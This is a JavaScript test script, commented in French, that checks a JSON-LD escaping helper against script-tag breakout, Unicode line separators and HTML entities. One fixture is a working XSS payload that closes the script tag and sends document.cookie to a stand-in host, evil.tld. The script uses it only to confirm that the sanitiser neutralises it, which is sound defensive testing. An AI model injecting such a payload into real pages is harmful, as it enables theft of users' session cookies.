// scripts/test-jsonld.mjs
//
// Verifie que src/lib/jsonLd.ts neutralise bien les caracteres capables de
// casser un contexte <script type="application/ld+json">.
//
// Le module TS est importe DIRECTEMENT (node >= 22.6 dépouille les annotations
// de type nativement) : pas de reimplementation, donc pas de risque que le test
// passe pendant que la source diverge.
//
//     node scripts/test-jsonld.mjs
//
// Tout est en ASCII pur : un U+2028 litteral dans un litteral REGEX est une
// SyntaxError JS -- c'est precisement le bug que ce helper previent.

import { jsonLd } from '../src/lib/jsonLd.ts';

const LS = String.fromCharCode(0x2028); // LINE SEPARATOR
const PS = String.fromCharCode(0x2029); // PARAGRAPH SEPARATOR

let failures = 0;

/** @param {string} label @param {unknown} actual @param {(v: any) => boolean} predicate */
function check(label, actual, predicate) {
  let ok;
  try {
    ok = predicate(actual);
  } catch {
    ok = false;
  }
  if (!ok) failures++;
  console.log(`${ok ? 'PASS' : 'FAIL'}  ${label}`);
  if (!ok) console.log(`      -> ${JSON.stringify(actual)}`);
}

// ── 1. Le payload d'attaque reel (cf. trombinoscope.astro) est neutralise ────
const attack = {
  '@type': 'Person',
  name: `</script><script>fetch('https://evil.tld/?c='+document.cookie)</script>`,
};
const out = jsonLd(attack);
check('aucun "<" litteral en sortie', out, (s) => !s.includes('<'));
check('aucun ">" litteral en sortie', out, (s) => !s.includes('>'));
check('aucun "&" litteral en sortie', out, (s) => !s.includes('&'));
check('la sous-chaine "</script" a disparu', out, (s) => !s.includes('</script'));

// ── 2. Round-trip : l'echappement ne deforme jamais la donnee ────────────────
check('JSON.parse restitue exactement la donnee', out, (s) => {
  const back = JSON.parse(s);
  return back.name === attack.name && back['@type'] === attack['@type'];
});

// ── 3. Separateurs de ligne Unicode ─────────────────────────────────────────
const seps = jsonLd({ bio: `ligne1${LS}ligne2${PS}ligne3` });
check('U+2028 echappe', seps, (s) => !s.includes(LS) && s.includes('\\u2028'));
check('U+2029 echappe', seps, (s) => !s.includes(PS) && s.includes('\\u2029'));
check('round-trip avec separateurs', seps, (s) => JSON.parse(s).bio === `ligne1${LS}ligne2${PS}ligne3`);

// ── 4. Cas nominal : un schema propre reste valide ──────────────────────────
const clean = jsonLd({ '@context': 'https://schema.org', '@type': 'Person', name: 'Alexis Gallard' });
check('schema propre : round-trip', clean, (s) => JSON.parse(s).name === 'Alexis Gallard');
check('schema propre : les "/" des URL sont intacts', clean, (s) => s.includes('https:'));
check('schema propre : @context preserve', clean, (s) => JSON.parse(s)['@context'] === 'https://schema.org');

// ── 5. L'entite HTML ne peut pas se redecoder ───────────────────────────────
const amp = jsonLd({ name: 'Tom &lt;script&gt;' });
check('&lt; ne peut pas se redecoder en <', amp, (s) => !s.includes('&'));
check('&lt; round-trip', amp, (s) => JSON.parse(s).name === 'Tom &lt;script&gt;');

// ── 6. Non-regression : contenu francais courant ────────────────────────────
const fr = jsonLd({ name: 'Benevoles & Cie', bio: 'Poitiers, cree en 2024' });
check('accents / esperluette : round-trip', fr, (s) => JSON.parse(s).name === 'Benevoles & Cie');

console.log(`\n${failures === 0 ? 'TOUS LES TESTS PASSENT' : `${failures} ECHEC(S)`}`);
process.exit(failures === 0 ? 0 : 1);
